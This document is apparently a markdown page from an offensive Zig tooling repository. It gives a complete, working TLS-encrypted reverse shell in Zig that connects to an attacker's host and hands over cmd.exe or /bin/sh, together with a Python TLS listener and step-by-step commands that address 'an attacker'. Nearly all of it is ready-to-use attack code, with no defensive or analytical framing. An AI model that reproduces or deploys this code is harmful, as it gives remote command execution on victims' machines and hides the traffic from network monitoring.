@@ -1,0 +1,185 @@
+# Reverse Shell With TLS
+
+## TL;DR
+
+[See the code example](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/src/Reverse-Shell/std_reverse_shell_with_tls)
+
+## Usage
+
+As an attacker, on the attacking machine, you should generate the certification and the key before starting a listener.
+
+```bash
+# Generate cert and key first
+openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost"
+
+# Start listener
+./listener.py 6666 server.crt server.key utf-8
+```
+
+After that, you can trigger the reverse shell on the target by passing the IP and port as the arguments.
+
+```bash
+./std_reverse_shell_with_tls example.com 6666
+```
+
+## Reverse Shell
+
+```zig title="main.zig"
+const std = @import("std");
+const builtin = @import("builtin");
+
+pub fn main() !void {
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    const args = try std.process.argsAlloc(allocator);
+    defer std.process.argsFree(allocator, args);
+
+    if (args.len != 3) {
+        std.debug.print("Usage: {s} <IP> <PORT>\n", .{args[0]});
+        return;
+    }
+
+    const target_hostname = args[1];
+    const target_port_str = args[2];
+
+    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {
+        std.debug.print("Error parsing port '{s}': {}\n", .{ target_port_str, err });
+        return;
+    };
+
+    var shell: []const []const u8 = undefined;
+
+    if (builtin.os.tag == .windows) {
+        shell = &[_][]const u8{"cmd.exe"};
+        std.debug.print("[+] Using cmd.exe as the shell\n", .{});
+    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {
+        shell = &[_][]const u8{"/bin/sh"};
+        std.debug.print("[+] Using /bin/sh as the shell\n", .{});
+    } else {
+        std.debug.print("[-] Cannot detect target OS\n", .{});
+        return;
+    }
+
+    std.debug.print("[+] Connecting to {s}:{d}\n", .{ target_hostname, target_port });
+
+    // Create TCP connection
+    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);
+    defer address_list.deinit();
+
+    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
+        std.debug.print("[-] Connection failed\n", .{});
+        return;
+    };
+    defer stream.close();
+
+    // Initialize TLS client
+    var tls_client = std.crypto.tls.Client.init(stream, .{
+        .host = .no_verification,
+        .ca = .self_signed,
+    }) catch |err| {
+        std.debug.print("[-] TLS initialization failed: {}\n", .{err});
+        return;
+    };
+
+    std.debug.print("[+] TLS connection established\n", .{});
+
+    // Start shell process
+    var process = std.process.Child.init(shell, allocator);
+    process.stdin_behavior = .Pipe;
+    process.stdout_behavior = .Pipe;
+    process.stderr_behavior = .Pipe;
+
+    try process.spawn();
+    defer _ = process.kill() catch {};
+
+    var buffer: [4096]u8 = undefined;
+
+    // Main I/O loop - similar to your original working version
+    while (true) {
+        // Read command from TLS connection
+        const bytes_read = tls_client.read(stream, &buffer) catch break;
+        if (bytes_read == 0) break;
+
+        // Send command to process stdin
+        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;
+
+        // Small delay to let command execute
+        std.time.sleep(100 * std.time.ns_per_ms);
+
+        // Try to read stdout first
+        if (process.stdout.?.read(&buffer)) |stdout_len| {
+            if (stdout_len > 0) {
+                _ = tls_client.writeAll(stream, buffer[0..stdout_len]) catch break;
+            }
+        } else |_| {
+            // If no stdout, try stderr
+            if (process.stderr.?.read(&buffer)) |stderr_len| {
+                if (stderr_len > 0) {
+                    _ = tls_client.writeAll(stream, buffer[0..stderr_len]) catch break;
+                }
+            } else |_| {
+                // If no output available, send a prompt or newline
+                _ = tls_client.writeAll(stream, "\n") catch break;
+            }
+        }
+    }
+
+    // Wait for process to finish
+    _ = process.wait() catch {};
+    std.debug.print("[+] Session ended\n", .{});
+}
+```
+
+## Listener (Python)
+
+```python title="listener.py"
+#!/usr/bin/env python3
+
+import socket
+import sys
+import threading
+import ssl
+
+if len(sys.argv) <= 4:
+    print(f"Usage: {sys.argv[0]} <port> <cert> <key> <encode>")
+    print(f"Example: python listener.py 6666 server.crt server.key utf-8")
+    exit(1)
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile=sys.argv[2], keyfile=sys.argv[3])
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(("0.0.0.0", int(sys.argv[1])))
+sock.listen()
+
+print(f"[+] TLS Listener started on port {sys.argv[1]}")
+print("[+] Waiting for connection...")
+
+conn, addr = sock.accept()
+
+try:
+    conn = context.wrap_socket(conn, server_side=True)
+    print("[+] TLS handshake completed successfully")
+    print("[+] Encrypted reverse shell session established")
+    print("=" * 50)
+except Exception as e:
+    print(f"[-] TLS handshake failed: {e}")
+    conn.close()
+    exit(1)
+def recv():
+    while True:
+        data = conn.recv(65535)
+        sys.stdout.buffer.write(data.decode(sys.argv[4]).encode())
+        #sys.stdout.buffer.write(data)
+        sys.stdout.buffer.flush()
+
+recvthread = threading.Thread(target=recv)
+recvthread.start()
+
+while True:
+    data = sys.stdin.buffer.readline()
+    conn.send(data.decode().encode(sys.argv[4]))
+    sys.stdin.buffer.flush()
+```
